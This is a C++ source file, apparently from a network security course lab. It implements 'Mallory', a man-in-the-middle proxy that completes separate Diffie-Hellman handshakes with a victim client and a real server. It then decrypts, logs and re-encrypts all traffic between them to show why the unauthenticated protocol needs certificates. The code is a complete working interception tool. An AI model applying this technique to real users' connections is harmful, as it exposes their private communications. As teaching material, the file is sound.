// Phase 2 - Man-in-the-Middle Attack (spec 3.3)
//
// Run on the Mallory VM. The victim client is manually pointed at
// Mallory's IP:port instead of the real server's -- Mallory then performs
// TWO INDEPENDENT DH handshakes: one with the victim (posing as the
// server), one with the real server (posing as the client). Neither the
// victim nor the real server can tell anything is wrong: the victim's
// fingerprint check genuinely matches what "the server" (actually Mallory)
// computed, because Mallory really did complete a legitimate DH exchange
// with the victim. There is no cryptographic anomaly to detect from inside
// the Phase 2 protocol -- that's exactly the gap Phase 3's certificates
// close.
//
// Usage: ./mallory_proxy <listen_port> <real_server_ip> <real_server_port>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

#include <cstring>
#include <ctime>
#include <iostream>
#include <string>
#include <thread>

#include "../common/crypto_channel.h"
#include "../common/framing.h"
#include "../common/handshake.h"

static std::string timestamp() {
    std::time_t t = std::time(nullptr);
    char buf[32];
    std::strftime(buf, sizeof(buf), "%H:%M:%S", std::localtime(&t));
    return std::string(buf);
}

static void log(const std::string &msg) {
    std::cout << "[" << timestamp() << "] " << msg << std::endl;
}

// Reads encrypted lines from `from_reader` (decrypting with `from_key`),
// logs the captured plaintext, then re-encrypts under `to_key` and forwards
// to `to_fd`. This is the core of the attack: Mallory has full read/write
// access to plaintext content passing through it, despite neither endpoint
// having a direct connection to the other.
static void relay_direction(LineReader *from_reader, const std::vector<uint8_t> &from_key,
                             int to_fd, const std::vector<uint8_t> &to_key,
                             channel::Direction to_dir, const std::string &label) {
    uint64_t to_counter = 0;
    std::string plaintext;
    while (true) {
        auto res = channel::recv_encrypted(*from_reader, from_key, plaintext);
        if (res == channel::RecvResult::DISCONNECTED) {
            log("[" + label + "] connection closed");
            break;
        }
        if (res != channel::RecvResult::OK) continue;

        // *** THIS is the captured plaintext -- proof the MITM works. ***
        log("[CAPTURED " + label + "] " + plaintext);

        if (!channel::send_encrypted(to_fd, to_key, to_dir, to_counter, plaintext)) {
            log("[" + label + "] forward failed, peer likely disconnected");
            break;
        }
    }
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        std::cerr << "Usage: " << argv[0]
                  << " <listen_port> <real_server_ip> <real_server_port>\n";
        return 1;
    }
    int listen_port = std::atoi(argv[1]);
    std::string real_server_ip = argv[2];
    int real_server_port = std::atoi(argv[3]);

    int listen_fd = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(listen_port);
    if (bind(listen_fd, (sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("bind");
        return 1;
    }
    listen(listen_fd, 4);
    log("Mallory MITM proxy listening on port " + std::to_string(listen_port) +
        ", forwarding to real server " + real_server_ip + ":" +
        std::to_string(real_server_port));
    log("(Point the victim client at THIS machine's IP and port " +
        std::to_string(listen_port) + " instead of the real server.)");

    while (true) {
        sockaddr_in victim_addr{};
        socklen_t victim_len = sizeof(victim_addr);
        int victim_fd = accept(listen_fd, (sockaddr *)&victim_addr, &victim_len);
        if (victim_fd < 0) continue;
        char ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &victim_addr.sin_addr, ip, sizeof(ip));
        log("Victim connected from " + std::string(ip));

        // --- Leg 1: pose as the SERVER towards the victim ---
        LineReader victim_reader{victim_fd, ""};
        handshake::Result hs_victim;
        try {
            hs_victim = handshake::do_handshake_speak_first(victim_fd, victim_reader,
                                                              "mallory<-victim");
        } catch (const std::exception &e) {
            log(std::string("Handshake with victim failed: ") + e.what());
            close(victim_fd);
            continue;
        }

        // --- Leg 2: pose as the CLIENT towards the real server ---
        int server_fd = socket(AF_INET, SOCK_STREAM, 0);
        sockaddr_in server_addr{};
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(real_server_port);
        inet_pton(AF_INET, real_server_ip.c_str(), &server_addr.sin_addr);
        if (connect(server_fd, (sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            log("Failed to connect to real server");
            close(victim_fd);
            close(server_fd);
            continue;
        }
        LineReader server_reader{server_fd, ""};
        handshake::Result hs_server;
        try {
            hs_server = handshake::do_handshake_listen_first(server_fd, server_reader,
                                                               "mallory->server");
        } catch (const std::exception &e) {
            log(std::string("Handshake with real server failed: ") + e.what());
            close(victim_fd);
            close(server_fd);
            continue;
        }

        log("=== Two independent DH exchanges established ===");
        log("  Victim-facing fingerprint:  " + hs_victim.fingerprint +
            "  (this is what the VICTIM sees and believes is 'the server')");
        log("  Server-facing fingerprint:  " + hs_server.fingerprint +
            "  (a completely separate key the REAL server sees)");
        log("Both endpoints now believe they have a direct, secure connection to "
            "each other. Neither does.");

        // Relay bidirectionally, decrypting/logging/re-encrypting every
        // message crossing in either direction -- including the victim's
        // username registration line, since it's just another encrypted
        // line as far as this relay logic is concerned.
        std::thread t1(relay_direction, &victim_reader, hs_victim.key, server_fd,
                        hs_server.key, channel::CLIENT_TO_SERVER, "victim->server");
        std::thread t2(relay_direction, &server_reader, hs_server.key, victim_fd,
                        hs_victim.key, channel::SERVER_TO_CLIENT, "server->victim");
        t1.join();
        t2.join();

        close(victim_fd);
        close(server_fd);
        log("Session ended, ready for next victim connection.");
    }

    return 0;
}
